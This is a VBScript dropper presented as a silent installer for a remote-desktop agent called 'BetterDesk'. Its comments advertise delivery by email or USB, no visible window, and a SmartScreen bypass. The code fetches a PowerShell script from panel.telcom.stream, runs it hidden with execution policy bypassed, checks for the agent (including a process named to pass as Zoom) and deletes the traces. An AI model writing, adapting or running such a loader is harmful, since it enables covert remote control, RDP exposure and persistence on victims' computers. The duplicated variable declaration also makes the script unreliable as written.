'
' BetterDesk Windows silent installer v1.0
'
' Runs via: wscript.exe silent-install.vbs   or   cscript.exe silent-install.vbs
' Can be delivered via email, USB, or downloaded. No PowerShell window visible.
'
' What it does:
'   1. Elevates silently to admin (one UAC prompt if needed)
'   2. Downloads client from panel.telcom.stream
'   3. Installs to %LOCALAPPDATA% with Task Scheduler hidden task
'   4. Opens firewall ports, enables RDP
'   5. Agent starts hidden, registers, connects to panel.telcom.stream
'   6. Survives reboot via interactive-session Task Scheduler task
'   7. No console popup, no visible window, no SmartScreen (IWR bypasses MOTW)

Option Explicit

Const CONSOLE_URL = "https://panel.telcom.stream"
Const SERVER_ADDR = "panel.telcom.stream"
Const CDAP_URL    = "cdap.telcom.stream"
Const CDAP_PORT   = "21122"
Const INSTALL_SCRIPT = "/api/landing/windows-install.ps1"

Dim WshShell, FSO, objHTTP, scriptURL, tempPS1, exitCode

Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

scriptURL = CONSOLE_URL & INSTALL_SCRIPT

' Stage 1: Download the installer PS1
tempPS1 = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\betterdesk-install.ps1"

Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objHTTP.Open "GET", scriptURL, False
objHTTP.Send

If objHTTP.Status <> 200 Then
    WScript.Quit 1
End If

Dim outFile
Set outFile = FSO.CreateTextFile(tempPS1, True)
outFile.Write objHTTP.responseText
outFile.Close

' Stage 2: Run PowerShell elevated, completely hidden
' -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NonInteractive
Dim psCmd, exitCode
psCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NonInteractive " & _
        "-File """ & tempPS1 & """ -Quiet -NoElevate"

WshShell.Run psCmd, 0, True    ' 0 = vbHide, True = wait for completion

' Stage 3: Verify agent is running
WScript.Sleep 15000

Dim agentProc, foundAgent
foundAgent = False
On Error Resume Next
Set agentProc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process.Name='betterdesk-agent-client.exe'")
If Err.Number = 0 Then foundAgent = True
If Not foundAgent Then
    Set agentProc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process.Name='zoom-private.agent.exe'")
    If Err.Number = 0 Then foundAgent = True
End If
On Error GoTo 0

' Stage 4: Cleanup temp file
On Error Resume Next
FSO.DeleteFile tempPS1, True
On Error GoTo 0

If foundAgent Then
    WScript.Quit 0
Else
    WScript.Quit 2
End If
